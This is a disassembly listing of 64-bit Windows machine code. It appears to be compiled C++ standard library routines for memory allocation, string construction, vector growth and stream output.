   140002d3b:	72 30                	jb     0x140002d6d
   140002d3d:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140002d41:	48 3b c1             	cmp    %rcx,%rax
   140002d44:	76 3f                	jbe    0x140002d85
   140002d46:	0f ae e8             	lfence
   140002d49:	48 8b c8             	mov    %rax,%rcx
   140002d4c:	e8 37 8a 03 00       	call   0x14003b788
   140002d51:	48 8b c8             	mov    %rax,%rcx
   140002d54:	48 85 c0             	test   %rax,%rax
   140002d57:	74 32                	je     0x140002d8b
   140002d59:	0f ae e8             	lfence
   140002d5c:	48 83 c0 27          	add    $0x27,%rax
   140002d60:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   140002d64:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140002d68:	48 83 c4 28          	add    $0x28,%rsp
   140002d6c:	c3                   	ret
   140002d6d:	48 85 c9             	test   %rcx,%rcx
   140002d70:	74 0c                	je     0x140002d7e
   140002d72:	0f ae e8             	lfence
   140002d75:	48 83 c4 28          	add    $0x28,%rsp
   140002d79:	e9 0a 8a 03 00       	jmp    0x14003b788
   140002d7e:	33 c0                	xor    %eax,%eax
   140002d80:	48 83 c4 28          	add    $0x28,%rsp
   140002d84:	c3                   	ret
   140002d85:	e8 66 7a 00 00       	call   0x14000a7f0
   140002d8a:	cc                   	int3
   140002d8b:	e8 10 f5 03 00       	call   0x1400422a0
   140002d90:	cc                   	int3
   140002d91:	cc                   	int3
   140002d92:	cc                   	int3
   140002d93:	cc                   	int3
   140002d94:	cc                   	int3
   140002d95:	cc                   	int3
   140002d96:	cc                   	int3
   140002d97:	cc                   	int3
   140002d98:	cc                   	int3
   140002d99:	cc                   	int3
   140002d9a:	cc                   	int3
   140002d9b:	cc                   	int3
   140002d9c:	cc                   	int3
   140002d9d:	cc                   	int3
   140002d9e:	cc                   	int3
   140002d9f:	cc                   	int3
   140002da0:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002da5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002daa:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002daf:	41 56                	push   %r14
   140002db1:	48 83 ec 20          	sub    $0x20,%rsp
   140002db5:	48 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rsi
   140002dbc:	ff ff 7f 
   140002dbf:	49 8b f8             	mov    %r8,%rdi
   140002dc2:	48 8b ea             	mov    %rdx,%rbp
   140002dc5:	4c 8b f1             	mov    %rcx,%r14
   140002dc8:	4c 3b c6             	cmp    %rsi,%r8
   140002dcb:	77 7d                	ja     0x140002e4a
   140002dcd:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   140002dd4:	00 
   140002dd5:	49 83 f8 10          	cmp    $0x10,%r8
   140002dd9:	73 0b                	jae    0x140002de6
   140002ddb:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140002ddf:	e8 4c 9b 03 00       	call   0x14003c930
   140002de4:	eb 4e                	jmp    0x140002e34
   140002de6:	48 8b c7             	mov    %rdi,%rax
   140002de9:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140002dee:	48 83 c8 0f          	or     $0xf,%rax
   140002df2:	48 3b c6             	cmp    %rsi,%rax
   140002df5:	77 0f                	ja     0x140002e06
   140002df7:	b9 16 00 00 00       	mov    $0x16,%ecx
   140002dfc:	48 8b f0             	mov    %rax,%rsi
   140002dff:	48 3b c1             	cmp    %rcx,%rax
   140002e02:	48 0f 42 f1          	cmovb  %rcx,%rsi
   140002e06:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   140002e0a:	e8 21 ff ff ff       	call   0x140002d30
   140002e0f:	4c 8b c7             	mov    %rdi,%r8
   140002e12:	49 89 06             	mov    %rax,(%r14)
   140002e15:	48 8b d5             	mov    %rbp,%rdx
   140002e18:	49 89 7e 10          	mov    %rdi,0x10(%r14)
   140002e1c:	48 8b c8             	mov    %rax,%rcx
   140002e1f:	49 89 76 18          	mov    %rsi,0x18(%r14)
   140002e23:	48 8b d8             	mov    %rax,%rbx
   140002e26:	e8 05 9b 03 00       	call   0x14003c930
   140002e2b:	c6 04 3b 00          	movb   $0x0,(%rbx,%rdi,1)
   140002e2f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002e34:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002e39:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002e3e:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002e43:	48 83 c4 20          	add    $0x20,%rsp
   140002e47:	41 5e                	pop    %r14
   140002e49:	c3                   	ret
   140002e4a:	e8 31 7a 00 00       	call   0x14000a880
   140002e4f:	cc                   	int3
   140002e50:	48 3b ca             	cmp    %rdx,%rcx
   140002e53:	74 78                	je     0x140002ecd
   140002e55:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002e5a:	57                   	push   %rdi
   140002e5b:	48 83 ec 20          	sub    $0x20,%rsp
   140002e5f:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002e64:	48 8b fa             	mov    %rdx,%rdi
   140002e67:	33 f6                	xor    %esi,%esi
   140002e69:	48 8b d9             	mov    %rcx,%rbx
   140002e6c:	0f 1f 40 00          	nopl   0x0(%rax)
   140002e70:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002e74:	48 83 fa 10          	cmp    $0x10,%rdx
   140002e78:	72 2c                	jb     0x140002ea6
   140002e7a:	48 8b 0b             	mov    (%rbx),%rcx
   140002e7d:	48 ff c2             	inc    %rdx
   140002e80:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002e87:	72 18                	jb     0x140002ea1
   140002e89:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140002e8d:	48 83 c2 27          	add    $0x27,%rdx
   140002e91:	49 2b c8             	sub    %r8,%rcx
   140002e94:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140002e98:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002e9c:	77 30                	ja     0x140002ece
   140002e9e:	49 8b c8             	mov    %r8,%rcx
   140002ea1:	e8 1e 89 03 00       	call   0x14003b7c4
   140002ea6:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140002eaa:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140002eb1:	00 
   140002eb2:	40 88 33             	mov    %sil,(%rbx)
   140002eb5:	48 83 c3 20          	add    $0x20,%rbx
   140002eb9:	48 3b df             	cmp    %rdi,%rbx
   140002ebc:	75 b2                	jne    0x140002e70
   140002ebe:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140002ec3:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140002ec8:	48 83 c4 20          	add    $0x20,%rsp
   140002ecc:	5f                   	pop    %rdi
   140002ecd:	c3                   	ret
   140002ece:	e8 cd f3 03 00       	call   0x1400422a0
   140002ed3:	cc                   	int3
   140002ed4:	cc                   	int3
   140002ed5:	cc                   	int3
   140002ed6:	cc                   	int3
   140002ed7:	cc                   	int3
   140002ed8:	cc                   	int3
   140002ed9:	cc                   	int3
   140002eda:	cc                   	int3
   140002edb:	cc                   	int3
   140002edc:	cc                   	int3
   140002edd:	cc                   	int3
   140002ede:	cc                   	int3
   140002edf:	cc                   	int3
   140002ee0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002ee5:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002eea:	57                   	push   %rdi
   140002eeb:	41 54                	push   %r12
   140002eed:	41 57                	push   %r15
   140002eef:	48 83 ec 20          	sub    $0x20,%rsp
   140002ef3:	48 8b 01             	mov    (%rcx),%rax
   140002ef6:	4c 8b fa             	mov    %rdx,%r15
   140002ef9:	48 8b 79 08          	mov    0x8(%rcx),%rdi
   140002efd:	4d 8b e0             	mov    %r8,%r12
   140002f00:	48 2b f8             	sub    %rax,%rdi
   140002f03:	4c 2b f8             	sub    %rax,%r15
   140002f06:	48 c1 ff 05          	sar    $0x5,%rdi
   140002f0a:	49 b8 ff ff ff ff ff 	movabs $0x7ffffffffffffff,%r8
   140002f11:	ff ff 07 
   140002f14:	48 8b ea             	mov    %rdx,%rbp
   140002f17:	48 8b d9             	mov    %rcx,%rbx
   140002f1a:	49 3b f8             	cmp    %r8,%rdi
   140002f1d:	0f 84 49 01 00 00    	je     0x14000306c
   140002f23:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140002f27:	48 ff c7             	inc    %rdi
   140002f2a:	48 2b c8             	sub    %rax,%rcx
   140002f2d:	4c 89 74 24 48       	mov    %r14,0x48(%rsp)
   140002f32:	48 c1 f9 05          	sar    $0x5,%rcx
   140002f36:	49 8b c0             	mov    %r8,%rax
   140002f39:	48 8b d1             	mov    %rcx,%rdx
   140002f3c:	48 d1 ea             	shr    $1,%rdx
   140002f3f:	48 2b c2             	sub    %rdx,%rax
   140002f42:	48 3b c8             	cmp    %rax,%rcx
   140002f45:	76 69                	jbe    0x140002fb0
   140002f47:	4d 8b f0             	mov    %r8,%r14
   140002f4a:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140002f4f:	0f ae e8             	lfence
   140002f52:	49 c1 e6 05          	shl    $0x5,%r14
   140002f56:	49 8b ce             	mov    %r14,%rcx
   140002f59:	e8 d2 fd ff ff       	call   0x140002d30
   140002f5e:	49 83 e7 e0          	and    $0xffffffffffffffe0,%r15
   140002f62:	48 8b f0             	mov    %rax,%rsi
   140002f65:	4c 03 f8             	add    %rax,%r15
   140002f68:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002f6b:	33 c0                	xor    %eax,%eax
   140002f6d:	4c 8b c6             	mov    %rsi,%r8
   140002f70:	41 0f 11 07          	movups %xmm0,(%r15)
   140002f74:	49 89 47 10          	mov    %rax,0x10(%r15)
   140002f78:	49 89 47 18          	mov    %rax,0x18(%r15)
   140002f7c:	41 0f 10 04 24       	movups (%r12),%xmm0
   140002f81:	41 0f 11 07          	movups %xmm0,(%r15)
   140002f85:	41 0f 10 4c 24 10    	movups 0x10(%r12),%xmm1
   140002f8b:	41 0f 11 4f 10       	movups %xmm1,0x10(%r15)
   140002f90:	49 89 44 24 10       	mov    %rax,0x10(%r12)
   140002f95:	49 c7 44 24 18 0f 00 	movq   $0xf,0x18(%r12)
   140002f9c:	00 00 
   140002f9e:	41 88 04 24          	mov    %al,(%r12)
   140002fa2:	48 3b 6b 08          	cmp    0x8(%rbx),%rbp
   140002fa6:	0f ae e8             	lfence
   140002fa9:	75 1e                	jne    0x140002fc9
   140002fab:	48 8b 2b             	mov    (%rbx),%rbp
   140002fae:	eb 2b                	jmp    0x140002fdb
   140002fb0:	48 8d 04 0a          	lea    (%rdx,%rcx,1),%rax
   140002fb4:	4c 8b f7             	mov    %rdi,%r14
   140002fb7:	48 3b c7             	cmp    %rdi,%rax
   140002fba:	4c 0f 43 f0          	cmovae %rax,%r14
   140002fbe:	4d 3b f0             	cmp    %r8,%r14
   140002fc1:	0f 87 ab 00 00 00    	ja     0x140003072
   140002fc7:	eb 81                	jmp    0x140002f4a
   140002fc9:	48 8b 0b             	mov    (%rbx),%rcx
   140002fcc:	4c 8b cb             	mov    %rbx,%r9
   140002fcf:	48 8b d5             	mov    %rbp,%rdx
   140002fd2:	e8 49 05 00 00       	call   0x140003520
   140002fd7:	4d 8d 47 20          	lea    0x20(%r15),%r8
   140002fdb:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140002fdf:	4c 8b cb             	mov    %rbx,%r9
   140002fe2:	48 8b cd             	mov    %rbp,%rcx
   140002fe5:	e8 36 05 00 00       	call   0x140003520
   140002fea:	48 8b 0b             	mov    (%rbx),%rcx
   140002fed:	48 85 c9             	test   %rcx,%rcx
   140002ff0:	74 40                	je     0x140003032
   140002ff2:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140002ff6:	4c 8b c3             	mov    %rbx,%r8
   140002ff9:	e8 52 fe ff ff       	call   0x140002e50
   140002ffe:	48 8b 0b             	mov    (%rbx),%rcx
   140003001:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140003005:	48 2b d1             	sub    %rcx,%rdx
   140003008:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   14000300c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140003013:	72 18                	jb     0x14000302d
   140003015:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140003019:	48 83 c2 27          	add    $0x27,%rdx
   14000301d:	49 2b c8             	sub    %r8,%rcx
   140003020:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   140003024:	48 83 f8 1f          	cmp    $0x1f,%rax
   140003028:	77 4e                	ja     0x140003078
   14000302a:	49 8b c8             	mov    %r8,%rcx
   14000302d:	e8 92 87 03 00       	call   0x14003b7c4
   140003032:	0f ae e8             	lfence
   140003035:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000303a:	49 8d 0c 36          	lea    (%r14,%rsi,1),%rcx
   14000303e:	4c 8b 74 24 48       	mov    0x48(%rsp),%r14
   140003043:	49 8b c7             	mov    %r15,%rax
   140003046:	48 89 33             	mov    %rsi,(%rbx)
   140003049:	48 c1 e7 05          	shl    $0x5,%rdi
   14000304d:	48 03 fe             	add    %rsi,%rdi
   140003050:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140003055:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140003059:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   14000305d:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140003062:	48 83 c4 20          	add    $0x20,%rsp
   140003066:	41 5f                	pop    %r15
   140003068:	41 5c                	pop    %r12
   14000306a:	5f                   	pop    %rdi
   14000306b:	c3                   	ret
   14000306c:	e8 2f 78 00 00       	call   0x14000a8a0
   140003071:	cc                   	int3
   140003072:	e8 79 77 00 00       	call   0x14000a7f0
   140003077:	cc                   	int3
   140003078:	e8 23 f2 03 00       	call   0x1400422a0
   14000307d:	cc                   	int3
   14000307e:	cc                   	int3
   14000307f:	cc                   	int3
   140003080:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003085:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000308a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000308f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003094:	41 56                	push   %r14
   140003096:	48 83 ec 30          	sub    $0x30,%rsp
   14000309a:	49 8b e8             	mov    %r8,%rbp
   14000309d:	4c 8b f2             	mov    %rdx,%r14
   1400030a0:	48 8b d9             	mov    %rcx,%rbx
   1400030a3:	33 f6                	xor    %esi,%esi
   1400030a5:	48 8b 01             	mov    (%rcx),%rax
   1400030a8:	4c 63 48 04          	movslq 0x4(%rax),%r9
   1400030ac:	49 8b 7c 09 28       	mov    0x28(%r9,%rcx,1),%rdi
   1400030b1:	48 85 ff             	test   %rdi,%rdi
   1400030b4:	7e 0a                	jle    0x1400030c0
   1400030b6:	49 3b f8             	cmp    %r8,%rdi
   1400030b9:	76 05                	jbe    0x1400030c0
   1400030bb:	49 2b f8             	sub    %r8,%rdi
   1400030be:	eb 02                	jmp    0x1400030c2
   1400030c0:	33 ff                	xor    %edi,%edi
   1400030c2:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400030c7:	49 8b 4c 09 48       	mov    0x48(%r9,%rcx,1),%rcx
   1400030cc:	48 85 c9             	test   %rcx,%rcx
   1400030cf:	74 0e                	je     0x1400030df
   1400030d1:	48 8b 01             	mov    (%rcx),%rax
   1400030d4:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400030d8:	ff 15 02 03 06 00    	call   *0x60302(%rip)        # 0x1400633e0
   1400030de:	90                   	nop
   1400030df:	48 8b 0b             	mov    (%rbx),%rcx
   1400030e2:	48 63 41 04          	movslq 0x4(%rcx),%rax
   1400030e6:	83 7c 18 10 00       	cmpl   $0x0,0x10(%rax,%rbx,1)
   1400030eb:	74 04                	je     0x1400030f1
   1400030ed:	32 c0                	xor    %al,%al
   1400030ef:	eb 2a                	jmp    0x14000311b
   1400030f1:	48 8b 44 18 50       	mov    0x50(%rax,%rbx,1),%rax
   1400030f6:	48 85 c0             	test   %rax,%rax
   1400030f9:	74 1e                	je     0x140003119
   1400030fb:	48 3b c3             	cmp    %rbx,%rax
   1400030fe:	74 19                	je     0x140003119
   140003100:	48 8b c8             	mov    %rax,%rcx
   140003103:	e8 28 7c 00 00       	call   0x14000ad30
   140003108:	48 8b 0b             	mov    (%rbx),%rcx
   14000310b:	48 63 41 04          	movslq 0x4(%rcx),%rax
   14000310f:	83 7c 18 10 00       	cmpl   $0x0,0x10(%rax,%rbx,1)
   140003114:	0f 94 c0             	sete   %al
   140003117:	eb 02                	jmp    0x14000311b
   140003119:	b0 01                	mov    $0x1,%al
   14000311b:	88 44 24 28          	mov    %al,0x28(%rsp)
   14000311f:	84 c0                	test   %al,%al
   140003121:	75 0a                	jne    0x14000312d
   140003123:	be 04 00 00 00       	mov    $0x4,%esi
   140003128:	e9 2d 01 00 00       	jmp    0x14000325a
   14000312d:	48 63 41 04          	movslq 0x4(%rcx),%rax
   140003131:	8b 4c 18 18          	mov    0x18(%rax,%rbx,1),%ecx
   140003135:	81 e1 c0 01 00 00    	and    $0x1c0,%ecx
   14000313b:	83 f9 40             	cmp    $0x40,%ecx
   14000313e:	74 6e                	je     0x1400031ae
   140003140:	48 85 ff             	test   %rdi,%rdi
   140003143:	74 69                	je     0x1400031ae
   140003145:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   14000314c:	00 00 00 00 
   140003150:	48 8b 03             	mov    (%rbx),%rax
   140003153:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003157:	4c 8b 44 19 48       	mov    0x48(%rcx,%rbx,1),%r8
   14000315c:	44 0f b6 4c 19 58    	movzbl 0x58(%rcx,%rbx,1),%r9d
   140003162:	49 8b 40 40          	mov    0x40(%r8),%rax
   140003166:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000316a:	74 24                	je     0x140003190
   14000316c:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140003170:	8b 01                	mov    (%rcx),%eax
   140003172:	85 c0                	test   %eax,%eax
   140003174:	7e 1a                	jle    0x140003190
   140003176:	ff c8                	dec    %eax
   140003178:	89 01                	mov    %eax,(%rcx)
   14000317a:	49 8b 48 40          	mov    0x40(%r8),%rcx
   14000317e:	48 8b 11             	mov    (%rcx),%rdx
   140003181:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140003185:	48 89 01             	mov    %rax,(%rcx)
   140003188:	44 88 0a             	mov    %r9b,(%rdx)
   14000318b:	41 8b c1             	mov    %r9d,%eax
   14000318e:	eb 13                	jmp    0x1400031a3
   140003190:	49 8b 00             	mov    (%r8),%rax
   140003193:	41 8b d1             	mov    %r9d,%edx
   140003196:	49 8b c8             	mov    %r8,%rcx
   140003199:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000319d:	ff 15 3d 02 06 00    	call   *0x6023d(%rip)        # 0x1400633e0
   1400031a3:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400031a6:	74 78                	je     0x140003220
   1400031a8:	48 83 ef 01          	sub    $0x1,%rdi
   1400031ac:	75 a2                	jne    0x140003150
   1400031ae:	48 8b 03             	mov    (%rbx),%rax
   1400031b1:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400031b5:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   1400031ba:	48 8b 01             	mov    (%rcx),%rax
   1400031bd:	4c 8b c5             	mov    %rbp,%r8
   1400031c0:	49 8b d6             	mov    %r14,%rdx
   1400031c3:	48 8b 40 48          	mov    0x48(%rax),%rax
   1400031c7:	ff 15 13 02 06 00    	call   *0x60213(%rip)        # 0x1400633e0
   1400031cd:	48 3b c5             	cmp    %rbp,%rax
   1400031d0:	75 75                	jne    0x140003247
   1400031d2:	48 85 ff             	test   %rdi,%rdi
   1400031d5:	74 73                	je     0x14000324a
   1400031d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400031de:	00 00 
   1400031e0:	48 8b 03             	mov    (%rbx),%rax
   1400031e3:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400031e7:	4c 8b 44 19 48       	mov    0x48(%rcx,%rbx,1),%r8
   1400031ec:	44 0f b6 4c 19 58    	movzbl 0x58(%rcx,%rbx,1),%r9d
   1400031f2:	49 8b 40 40          	mov    0x40(%r8),%rax
   1400031f6:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400031fa:	74 2b                	je     0x140003227
   1400031fc:	49 8b 48 58          	mov    0x58(%r8),%rcx
   140003200:	8b 01                	mov    (%rcx),%eax
   140003202:	85 c0                	test   %eax,%eax
   140003204:	7e 21                	jle    0x140003227
   140003206:	ff c8                	dec    %eax
   140003208:	89 01                	mov    %eax,(%rcx)
   14000320a:	49 8b 48 40          	mov    0x40(%r8),%rcx
   14000320e:	48 8b 11             	mov    (%rcx),%rdx
   140003211:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140003215:	48 89 01             	mov    %rax,(%rcx)
   140003218:	44 88 0a             	mov    %r9b,(%rdx)
   14000321b:	41 8b c1             	mov    %r9d,%eax
   14000321e:	eb 1a                	jmp    0x14000323a
   140003220:	be 04 00 00 00       	mov    $0x4,%esi
   140003225:	eb ab                	jmp    0x1400031d2
   140003227:	49 8b 00             	mov    (%r8),%rax
   14000322a:	41 8b d1             	mov    %r9d,%edx
   14000322d:	49 8b c8             	mov    %r8,%rcx
   140003230:	48 8b 40 18          	mov    0x18(%rax),%rax
   140003234:	ff 15 a6 01 06 00    	call   *0x601a6(%rip)        # 0x1400633e0
   14000323a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000323d:	74 08                	je     0x140003247
   14000323f:	48 83 ef 01          	sub    $0x1,%rdi
   140003243:	75 9b                	jne    0x1400031e0
   140003245:	eb 03                	jmp    0x14000324a
   140003247:	83 ce 04             	or     $0x4,%esi
   14000324a:	48 8b 03             	mov    (%rbx),%rax
   14000324d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003251:	48 c7 44 19 28 00 00 	movq   $0x0,0x28(%rcx,%rbx,1)
   140003258:	00 00 
   14000325a:	48 8b 03             	mov    (%rbx),%rax
   14000325d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003261:	48 03 cb             	add    %rbx,%rcx
   140003264:	45 33 c0             	xor    %r8d,%r8d
   140003267:	8b d6                	mov    %esi,%edx
   140003269:	e8 e2 85 00 00       	call   0x14000b850
   14000326e:	90                   	nop
   14000326f:	48 8b 03             	mov    (%rbx),%rax
   140003272:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003276:	83 7c 19 10 00       	cmpl   $0x0,0x10(%rcx,%rbx,1)
   14000327b:	75 35                	jne    0x1400032b2
   14000327d:	f6 44 19 18 02       	testb  $0x2,0x18(%rcx,%rbx,1)
   140003282:	74 2e                	je     0x1400032b2
   140003284:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   140003289:	48 8b 01             	mov    (%rcx),%rax
   14000328c:	48 8b 40 68          	mov    0x68(%rax),%rax
   140003290:	ff 15 4a 01 06 00    	call   *0x6014a(%rip)        # 0x1400633e0
   140003296:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003299:	75 17                	jne    0x1400032b2
   14000329b:	48 8b 03             	mov    (%rbx),%rax
   14000329e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400032a2:	48 03 cb             	add    %rbx,%rcx
   1400032a5:	45 33 c0             	xor    %r8d,%r8d
   1400032a8:	41 8d 50 04          	lea    0x4(%r8),%edx
   1400032ac:	e8 9f 85 00 00       	call   0x14000b850
   1400032b1:	90                   	nop
   1400032b2:	48 8b 03             	mov    (%rbx),%rax
   1400032b5:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400032b9:	48 8b 4c 19 48       	mov    0x48(%rcx,%rbx,1),%rcx
   1400032be:	48 85 c9             	test   %rcx,%rcx
   1400032c1:	74 0e                	je     0x1400032d1
   1400032c3:	48 8b 01             	mov    (%rcx),%rax
   1400032c6:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400032ca:	ff 15 10 01 06 00    	call   *0x60110(%rip)        # 0x1400633e0
   1400032d0:	90                   	nop
   1400032d1:	48 8b c3             	mov    %rbx,%rax
   1400032d4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400032d9:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400032de:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400032e3:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400032e8:	48 83 c4 30          	add    $0x30,%rsp
   1400032ec:	41 5e                	pop    %r14
   1400032ee:	c3                   	ret
   1400032ef:	cc                   	int3
   1400032f0:	40 53                	rex push %rbx
   1400032f2:	56                   	push   %rsi
   1400032f3:	57                   	push   %rdi
   1400032f4:	41 57                	push   %r15
   1400032f6:	48 83 ec 28          	sub    $0x28,%rsp
   1400032fa:	48 8b 71 10          	mov    0x10(%rcx),%rsi
   1400032fe:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   140003305:	ff ff 7f 
   140003308:	48 8b c3             	mov    %rbx,%rax
   14000330b:	4d 8b f9             	mov    %r9,%r15
   14000330e:	48 2b c6             	sub    %rsi,%rax
   140003311:	48 8b f9             	mov    %rcx,%rdi
   140003314:	48 3b c2             	cmp    %rdx,%rax
   140003317:	0f 82 29 01 00 00    	jb     0x140003446
   14000331d:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140003322:	48 8b 69 18          	mov    0x18(%rcx),%rbp
   140003326:	4c 89 64 24 58       	mov    %r12,0x58(%rsp)
   14000332b:	4c 8d 24 16          	lea    (%rsi,%rdx,1),%r12
   14000332f:	49 8b d4             	mov    %r12,%rdx
   140003332:	4c 89 6c 24 60       	mov    %r13,0x60(%rsp)
   140003337:	48 83 ca 0f          	or     $0xf,%rdx
   14000333b:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   140003340:	48 3b d3             	cmp    %rbx,%rdx
   140003343:	77 1f                	ja     0x140003364
   140003345:	48 8b cd             	mov    %rbp,%rcx
   140003348:	48 8b c3             	mov    %rbx,%rax
   14000334b:	48 d1 e9             	shr    $1,%rcx
   14000334e:	48 2b c1             	sub    %rcx,%rax
   140003351:	48 3b e8             	cmp    %rax,%rbp
   140003354:	77 0e                	ja     0x140003364
   140003356:	48 8d 04 29          	lea    (%rcx,%rbp,1),%rax
   14000335a:	48 8b da             	mov    %rdx,%rbx
   14000335d:	48 3b d0             	cmp    %rax,%rdx
   140003360:	48 0f 42 d8          	cmovb  %rax,%rbx
   140003364:	48 8d 4b 01          	lea    0x1(%rbx),%rcx
   140003368:	e8 c3 f9 ff ff       	call   0x140002d30
   14000336d:	49 2b f7             	sub    %r15,%rsi
   140003370:	4c 89 67 10          	mov    %r12,0x10(%rdi)
   140003374:	48 89 5f 18          	mov    %rbx,0x18(%rdi)
   140003378:	4c 8b f0             	mov    %rax,%r14
   14000337b:	4d 8b c7             	mov    %r15,%r8
   14000337e:	48 8b c8             	mov    %rax,%rcx
   140003381:	4e 8d 24 38          	lea    (%rax,%r15,1),%r12
   140003385:	4c 8d 6e 01          	lea    0x1(%rsi),%r13
   140003389:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   14000338e:	49 8d 1c 34          	lea    (%r12,%rsi,1),%rbx
   140003392:	48 83 fd 10          	cmp    $0x10,%rbp
   140003396:	72 5d                	jb     0x1400033f5
   140003398:	48 8b 1f             	mov    (%rdi),%rbx
   14000339b:	48 8b d3             	mov    %rbx,%rdx
   14000339e:	e8 8d 95 03 00       	call   0x14003c930
   1400033a3:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   1400033a8:	4c 8b c6             	mov    %rsi,%r8
   1400033ab:	49 8b cc             	mov    %r12,%rcx
   1400033ae:	e8 7d 95 03 00       	call   0x14003c930
   1400033b3:	4a 8d 14 3b          	lea    (%rbx,%r15,1),%rdx
   1400033b7:	4d 8b c5             	mov    %r13,%r8
   1400033ba:	49 8d 0c 34          	lea    (%r12,%rsi,1),%rcx
   1400033be:	e8 6d 95 03 00       	call   0x14003c930
   1400033c3:	48 8d 55 01          	lea    0x1(%rbp),%rdx
   1400033c7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400033ce:	72 18                	jb     0x1400033e8
   1400033d0:	48 8b 4b f8          	mov    -0x8(%rbx),%rcx
   1400033d4:	48 83 c2 27          	add    $0x27,%rdx
   1400033d8:	48 2b d9             	sub    %rcx,%rbx
   1400033db:	48 8d 43 f8          	lea    -0x8(%rbx),%rax
   1400033df:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400033e3:	77 5b                	ja     0x140003440
   1400033e5:	48 8b d9             	mov    %rcx,%rbx
   1400033e8:	0f ae e8             	lfence
   1400033eb:	48 8b cb             	mov    %rbx,%rcx
   1400033ee:	e8 d1 83 03 00       	call   0x14003b7c4
   1400033f3:	eb 27                	jmp    0x14000341c
   1400033f5:	48 8b d7             	mov    %rdi,%rdx
   1400033f8:	e8 33 95 03 00       	call   0x14003c930
   1400033fd:	48 8b 54 24 70       	mov    0x70(%rsp),%rdx
   140003402:	4c 8b c6             	mov    %rsi,%r8
   140003405:	49 8b cc             	mov    %r12,%rcx
   140003408:	e8 23 95 03 00       	call   0x14003c930
   14000340d:	49 8d 14 3f          	lea    (%r15,%rdi,1),%rdx
   140003411:	4d 8b c5             	mov    %r13,%r8
   140003414:	48 8b cb             	mov    %rbx,%rcx
